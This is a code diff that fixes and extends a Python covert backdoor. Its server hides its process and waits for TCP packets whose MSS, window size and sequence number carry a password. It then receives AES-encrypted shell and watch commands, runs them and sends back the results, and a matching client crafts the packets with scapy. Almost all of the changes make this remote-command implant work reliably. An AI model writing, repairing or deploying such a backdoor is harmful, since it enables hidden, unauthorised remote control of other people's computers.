@@ -6,6 +6,8 @@ import Crypto.Cipher
 import struct
 import time
 
+PASSWORD_LEN=8
+
 FIN = 0x01
 SYN = 0x02
 RST = 0x04
@@ -21,7 +23,7 @@ def make_iv():
     timestamp = time.time()
 
     # for the forseeable future, timestamp is representable in 4 bytes
-    iv = struct.pack(">I>I>I>I", timestamp, timestamp, timestamp, timestamp)
+    iv = struct.pack("<IIII", timestamp, timestamp, timestamp, timestamp)
     return iv
 
 class BackdoorServer(object):
@@ -78,20 +80,26 @@ class BackdoorServer(object):
             decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
             decrypted = decryptor.decrypt(buf[16:])
 
-            if len(decrypted) < 11: # password length + command byte
+            if len(decrypted) < PASSWORD_LEN + 1: # password length + command byte
                 continue
 
-            if decrypted[0:10] == self.password:
-                cmdbytes = buf[10:]
+            # We may have had to pad the payload for encryption; the size of the payload without
+            # padding is stored in the first 4 bytes
+            nopaddinglen = struct.unpack("<I", decrypted[0:4])[0]
+            start = 4
+            if decrypted[start:start+PASSWORD_LEN] == self.password:
+                start += PASSWORD_LEN
+                cmdbytes = decrypted[start:start+nopaddinglen]
+                cmdtype = cmdbytes[0] if isinstance(cmdbytes[0], int) else ord(cmdbytes[0])
 
-                if cmdbytes[0] == command.Command.SHELL:
-                    cmd = command.ShellComand.from_bytes(cmdbytes)
-                elif cmdbytes[0] == command.Command.WATCH:
+                if cmdtype == command.Command.SHELL:
+                    cmd = command.ShellCommand.from_bytes(cmdbytes)
+                elif cmdtype == command.Command.WATCH:
                     cmd = command.WatchCommand.from_bytes(cmdbytes)
-                elif cmdbytes[0] == command.Command.END:
+                elif cmdtype == command.Command.END:
                     cmd = None
                 else:
-                    raise ValueError("Unknown command type {}".format(cmdbytes[0]))
+                    raise ValueError("Unknown command type {}".format(cmdtype))
 
                 return cmd
 
@@ -103,11 +111,17 @@ class BackdoorServer(object):
         result - A Result object containing the command's result.
         """
         payload = self.password + result.to_bytes()
-        iv = make_iv()
-        
+        payload = struct.pack("<I", len(payload)) + payload
+
+        remainder = len(payload) % Crypto.Cipher.AES.block_size
+        if remainder:
+            payload += '\0' * (Crypto.Cipher.AES.block_size - remainder)
+
+        iv = make_iv()        
         encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
         payload = encryptor.encrypt(payload)
         payload = iv + payload
+
         self.send(payload)
 
     def run(self):
@@ -115,18 +129,25 @@ class BackdoorServer(object):
         self.mask_process()
         while True:
             self.listen()
+            print("Client connected: {}".format(self.client))
+            print("")
+
             while True:
-                try:
-                    cmd = self.recv_command()
-                    if not cmd:
-                        break
-
-                    result = cmd.run()
-                    self.send_result(result)
-
-                except Exception, err:
-                    print(str(err))
+                #try:
+                cmd = self.recv_command()
+                if not cmd:
                     break
+
+                result = cmd.run()
+
+                print(str(cmd))
+                print(str(result))
+
+                self.send_result(result)
+
+                #except Exception, err:
+#                print(str(err))
+#                break
 
 class TcpBackdoorServer(BackdoorServer):
 
@@ -136,8 +157,10 @@ class TcpBackdoorServer(BackdoorServer):
         self.dport = clientport
 
     def listen(self):
-        # If MSS option + window size + ISN == the password and the traffic is bound for the correct port, we have a client
+        # Create a new random source port from which to send
+        self.sport = RandShort()
 
+        # If MSS option + window size + ISN == the password and the traffic is bound for the correct port, we have a client
         self.client = None
         def is_auth(packet):
             if len(packet["TCP"].options) == 0:
@@ -152,11 +175,9 @@ class TcpBackdoorServer(BackdoorServer):
             window = packet["TCP"].window
             isn = packet["TCP"].seq
 
-            pw = struct.pack(">H>H>I", mss, window, isn)
+            pw = struct.pack("<HHI", mss, window, isn)
             if pw == self.password:
-                # sure, this is totally inefficient, but I don't know (and don't care to find out)
-                # what happens if I pass the client as an int to the IP() constructor
-                self.client = inet_ntoa(packet.src)
+                self.client = packet["IP"].src
                 return True
             else:
                 return False
@@ -165,10 +186,10 @@ class TcpBackdoorServer(BackdoorServer):
         sniff(filter=bpf_filter, stop_filter=is_auth)
 
     def recv(self):
-        bpf_filter = "tcp dst port {} src {}".format(self.lport, self.client)
+        bpf_filter = "src host {} and tcp dst port {}".format(self.client, self.lport)
         pkts = sniff(filter=bpf_filter, count=1)
 
-        return pkts[0].payload
+        return bytes(pkts[0]["TCP"].payload)
 
     def send(self, payload):
         try:
@@ -223,7 +244,14 @@ class BackdoorClient(object):
         """
         iv = make_iv()
         encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
-        payload = password + command.to_bytes()
+        payload = self.password + command.to_bytes()
+        payload = struct.pack("<I", len(payload)) + payload
+        
+        # blocks have to be padded to multiples of 16 bytes for AES
+        remainder = len(payload) % Crypto.Cipher.AES.block_size
+        if remainder:
+            payload += '\0' * (Crypto.Cipher.AES.block_size - remainder)
+
         payload = encryptor.encrypt(payload)
         payload = iv + payload
 
@@ -243,21 +271,29 @@ class BackdoorClient(object):
             decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)           
             decrypted = decryptor.decrypt(raw[16:])
             
-            if len(decrypted) < 11: # password + command byte
+            if len(decrypted) < PASSWORD_LEN + 1: # password + command byte
                 continue
 
-            if decrypted[0:10] == self.password:
-                resulttype = decrypted[10]
-                if resulttype == Command.SHELL:
-                    return ShellCommand.Result.from_bytes(decrypted[10:])
-                elif resulttye == Command.WATCH:
-                    return WatchCommand.Result.from_bytes(decrypted[10:])
+            # We may have had to pad the payload for encryption; the size of the payload without
+            # padding is stored in the first 4 bytes
+            nopaddinglen = struct.unpack("<I", decrypted[0:4])[0]
+            start = 4
+
+            if decrypted[start:start+PASSWORD_LEN] == self.password:
+                start += PASSWORD_LEN
+                resultbytes = decrypted[start:start+nopaddinglen]
+                resulttype = resultbytes[0] if isinstance(resultbytes[0], int) else ord(resultbytes[0])
+
+                if resulttype == command.Command.SHELL:
+                    return command.ShellCommand.Result.from_bytes(resultbytes)
+                elif resulttype == command.Command.WATCH:
+                    return command.WatchCommand.Result.from_bytes(resultbytes)
                 else:
                     print("Unhandled result type {}".format(resulttype))
                     sys.exit(1)
 
 class TcpBackdoorClient(BackdoorClient):
-    def __init__(self, aeskey, password, server, listenport, serverport):
+    def __init__(self, aeskey, password, listenport, serverport, server):
         super(TcpBackdoorClient, self).__init__(aeskey, password)
         self.server = server
         self.lport = listenport
@@ -265,7 +301,7 @@ class TcpBackdoorClient(BackdoorClient):
 
     def connect(self):
         # Insert the password into the packet so that the server can authenticate us
-        mss, windowsize, isn = struct.unpack(">H>H>I", self.password)
+        mss, windowsize, isn = struct.unpack("<HHI", self.password)
 
         self.sport = RandShort()
         self.seq = isn
@@ -284,13 +320,13 @@ class TcpBackdoorClient(BackdoorClient):
                      / Raw(load=payload)
 
             self.seq += len(payload)
-            r = sr1(packet)
+            send(packet) # TODO: Why doesn't this receive a response if it's sr1 instead of send()?
         except Exception, err:
             print(str(err))
             sys.exit(1)
 
     def recv(self):
-        bpf_filter = "tcp src host {} dst port {}".format(self.server, self.lport)
+        bpf_filter = "src host {} and tcp dst port {}".format(self.server, self.lport)
         pkts = sniff(filter=bpf_filter, count=1)
 
-        return pkts[0].payload
+        return bytes(pkts[0]["TCP"].payload.load)
